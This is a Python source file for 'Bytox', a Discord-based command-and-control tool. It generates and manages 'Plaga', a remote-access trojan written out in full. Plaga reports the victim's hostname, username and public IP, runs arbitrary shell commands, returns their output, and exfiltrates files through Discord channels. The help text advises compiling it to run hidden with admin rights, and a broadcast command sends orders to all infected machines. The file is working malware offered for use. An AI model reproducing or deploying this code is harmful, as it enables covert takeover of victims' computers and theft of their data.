import os, time, discord, getpass, json
from colorama import Fore as F, init
from discord.ext import commands

if os.path.exists(os.getcwd() + '/conf.json'):
    pass
else:
    print(f"{F.RED}[BYTOX-ERROR] {F.YELLOW}You do not have a conf.json file")
    print(f"{F.RED}[BYTOX-ERROR] {F.YELLOW}Please run Builder.py")
    time.sleep(2)
    exit()

banner = f'''{F.RED}██████╗ ██╗   ██╗████████╗ ██████╗ ██╗  ██╗
██╔══██╗╚██╗ ██╔╝╚══██╔══╝██╔═══██╗╚██╗██╔╝
██████╔╝ ╚████╔╝    ██║   ██║   ██║ ╚███╔╝ 
██╔══██╗  ╚██╔╝     ██║   ██║   ██║ ██╔██╗ 
██████╔╝   ██║      ██║   ╚██████╔╝██╔╝ ██╗
╚═════╝    ╚═╝      ╚═╝    ╚═════╝ ╚═╝  ╚═╝''' + F.RESET


with open("./conf.json") as f:
    jsonDump = json.load(f)

token_json = jsonDump["Token"]
prefix_json = jsonDump["Prefix"]
channel_json_id = jsonDump["Channel"]

token = token_json
notification_chan = int(channel_json_id) 
intents = discord.Intents.all()
intents.message_content = True
__version__ = '1.0'
posi = f'{F.WHITE}[{F.GREEN}+{F.WHITE}]'
err = f'{F.WHITE}[{F.RED}!{F.WHITE}]'

bytox = commands.Bot(description='Bytox_C2', command_prefix=prefix_json, intents=intents)
bytox.remove_command('help')

init()

@bytox.event
async def on_ready():
    print('')
    av_url = bytox.user.avatar_url
    print(banner)
    print(F.WHITE + '- Developed by BlackoutDev -' + F.RESET)
    channs = bytox.get_channel(notification_chan)
    os.system('cls')
    print(f'{F.GREEN}[BYTOX]{F.RESET} Online')
    embed = discord.Embed(title='**[+] BYTOX C2 ONLINE [+]**', description='** **', color=0xFF00FF)
    embed.add_field(name='** **', value=f'Version: `{__version__}`', inline=False)
    embed.add_field(name='** **', value=f'Prefix: `{prefix_json}`', inline=False)
    embed.set_thumbnail(url=av_url)
    embed.set_footer(text='Created by BlackoutDev')
    await channs.send(embed=embed)

@bytox.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send('`[!]` Command not found!')
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('`[!]` Missing argument!')

@bytox.command()
async def help(ctx):
    av_url = bytox.user.avatar_url
    await ctx.message.delete()
    try:
        embed = discord.Embed(title='**Bytox Help**', description='** **', color=0x00FFFF)
        embed.add_field(name='** **', value='*py_payload*  - creates a python payload', inline=False)
        embed.add_field(name='** **', value='*set_noti <channel_id>* - creates notification channel', inline=False)
        embed.add_field(name='** **', value='all_cmd <command> - sends a command to all payloads', inline=False)
        embed.add_field(name='** **', value='more_<command> - tells you more info about the command', inline=False)
        embed.set_thumbnail(url=av_url)
        embed.set_footer(text='Created by BlackoutDev')
        await ctx.send(embed=embed)
    except Exception:
        await ctx.send('`[!]` Could not complete `help` command')

@bytox.command()
async def more_py_payload(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(title='Py_Payload Command', description='** **', color=0xFF0000)
        embed.add_field(name='** **', value='Py_Payload will create a simple yet powerful python shell called Plaga.', inline=False)
        embed.add_field(name='** **', value='This payload has limited options however still manages to do the job just as well as the C++ payload.', inline=False)
        embed.add_field(name='** **', value='The following commands are:', inline=False)
        embed.add_field(name='** **', value='cmd <cmd> - this will execute a system command on the target and then feed the output back to you via your discord channel.', inline=False)
        embed.add_field(name='** **', value='download <file> - this will try to download a file from the target system. It is limited to 8mb', inline=False)
        embed.add_field(name='** **', value='** **', inline=False)
        embed.add_field(name='** **', value='Plaga shell can be compiled with `pyinstaller` so it allows it to run on Windows Operating Systems. Use the following command.', inline=False)
        embed.add_field(name='** **', value='`pyinstaller <file_name.py> --onefile --uac-admin --no-console', inline=False)
        embed.set_footer(text='Created by BlackoutDev')
        await ctx.send(embed=embed)
    except Exception:
        await ctx.send('`[!]` Could not execute `more_py_payload` command')

@bytox.command()
async def more_set_noti(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(title='**Set_Noti Command**', description='** **', color=0xFF0000)
        embed.add_field(name='** **', value='Set_Noti will change your notification channel to what ever you speficy it as.', inline=False)
        embed.add_field(name='** **', value='You will need to have the Discord Developer option switched on as you will need the channel ID of the channel you want to use.', inline=False)
        embed.add_field(name='** **', value='Example: `!set_noti 098098098098`', inline=False)
        embed.set_footer(text='Created by BlackoutDev')
        await ctx.send(embed=embed)
    except Exception:
        await ctx.send('`[!]` Could not execute `more_set_noti` command')

@bytox.command()
async def more_all_cmd(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(title='All_Cmd Command', description='** **', color=0xFF0000)
        embed.add_field(name='** **', value='All_Cmd will try to send a command to all of the machines you have a session on. This can become chaotic and is a command still in beta.', inline=False)
        embed.add_field(name='** **', value='***This command may not work as explained it is in beta and may need reviewing***', inline=False)
        embed.add_field(name='** **', value='Example: !all_cmd echo "Hello" >> king.txt', inline=False)
        embed.set_footer(text='Created by BlackoutDev')
        await ctx.send(embed=embed)
    except Exception:
        await ctx.send('`[!]` Could not execute `more_all_cmd` command')

@bytox.command()
async def py_payload(ctx, tk, *, file_name):
    await ctx.message.delete()
    guild = ctx.guild
    token = tk
    file_name = file_name
    first_br = '{'
    second_br = '}'
    hostname = f'{first_br}hostname{second_br}'
    user = f'{first_br}user{second_br}'
    cmds = f'{first_br}cmds{second_br}'
    file = f'{first_br}file{second_br}'
    payload = f'''import os, getpass, discord, requests, random, asyncio, socket, shutil
from discord.ext import commands


def req_ip():
    ip = requests.get("https://api.ipify.org").text
    return ip

def hex():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

Plaga = commands.Bot(description='Plaga Shell', command_prefix='>', bot=True)
Plaga.remove_command('help')
loop = asyncio.get_event_loop()

@Plaga.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send('Command not found!')
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('Missing argument!')

@Plaga.event
async def on_ready():
    hostname = socket.gethostname()
    channel = Plaga.get_channel({notification_chan}) #CHANGE THIS
    user = getpass.getuser()
    embed = discord.Embed(title=':white_check_mark: Plaga Connection', description='** **', colour=hex())
    embed.add_field(name=f':computer:  Hostname: `{hostname}`', value='** **', inline=False)
    embed.add_field(name=f':man:  User: `{user}`', value='** **', inline=False)
    embed.add_field(name=':globe_with_meridians:  IP: `' + req_ip() + '`', value='** **', inline=False)
    embed.add_field(name=':keyboard:  Prefix: `?`', value='** **', inline=False)

    await channel.send(embed=embed)

@Plaga.command()
async def cmd(ctx, *, cmds):
    await ctx.message.delete()
    try:
        output = os.popen(f'{cmds}').read()
        os.system(f'{cmds} > C:\\ProgramData\cmd.txt')
        f = open('C:\\ProgramData\cmd.txt', 'w')
        f.write(output)
        f.close()
        await ctx.send(file=discord.File(r'C:\\ProgramData\cmd.txt'))
        os.remove('C:\\ProgramData\cmd.txt')
    except Exception:
        await ctx.send('`[!]` Could not execute command')

@Plaga.command()
async def download(ctx, *, file):
    user = getpass.getuser()
    await ctx.message.delete()
    if file == None:
        await ctx.send('`[!]` You need to specify a file')
        await ctx.send(f'`[?]` Syntax: download C://Users/{user}/Desktop/Test.txt')
    else:
        try:
            await ctx.send(file=discord.File(file))
            await ctx.send('`[+]` File downloaded')
        except Exception:
            await ctx.send(f'`[!]` Could not download {file}')

loop.create_task(Plaga.start('{token}')) #CHANGE THIS

try:
    loop.run_forever()
except:
    loop.stop()'''
    try:
        with open(f'Compiled/{file_name}.py', 'w') as f:
            f.write(payload)
            f.close()
        await ctx.send('`[+]` Payload created')
        n=0
        channel = await ctx.guild.create_text_channel(f'session-{n}')
        n = n+1
        av_url = bytox.user.avatar_url
        embed = discord.Embed(title='**PlagaShell Commands**', description='** **')
        embed.add_field(name='** **', value='*cmd [command]* - will execute system commands')
        embed.add_field(name='** **', value='*download [file_path]* - will download a file (limited to 8MB)')
        embed.set_thumbnail(url=av_url)
        embed.set_footer(text='Created by BlackoutDev')
        try:
            await channel.send(embed=embed)
        except Exception:
            await ctx.send(embed=embed)
    except Exception:
        await ctx.send('`[!]` Could not execute `py_payload` command')

@bytox.command()
async def set_noti(ctx, *, chan_id):
    await ctx.message.delete()
    if chan_id == None:
        await ctx.send('`[!]` Specify a channel ID')
    else:
        try:
            av_url = bytox.user.avatar_url
            notification_chan = int(chan_id)
            embed = discord.Embed(title='**Bytox Notification**', description='** **', color=0x7CFC00)
            embed.add_field(name='** **', value=f'This is your new notification channel', inline=False)
            embed.set_thumbnail(url=av_url)
            embed.set_footer(text='Created by BlackoutDev')
            channs = bytox.get_channel(notification_chan)
            await channs.send(embed=embed)
        except:
            await ctx.send('`[!]` Could not set channel')

######## BETA COMMAND ########
@bytox.command()
async def all_cmd(ctx, *, cmd):
    await ctx.message.delete()
    guild = ctx.guild
    text_channel_list = []
    for channel in guild.text_channels:
        text_channel_list.append(channel)
    try:
        for send_chan in text_channel_list:
            if send_chan.startswith('session-'):
                try:
                    await send_chan.send(f'>cmd {cmd}')
                except Exception:
                    await ctx.send(f'`[!]` Could not send command too {send_chan}')
    except Exception:
        await ctx.send('`[!]` Could not execute `all_cmd` command')


bytox.run(token)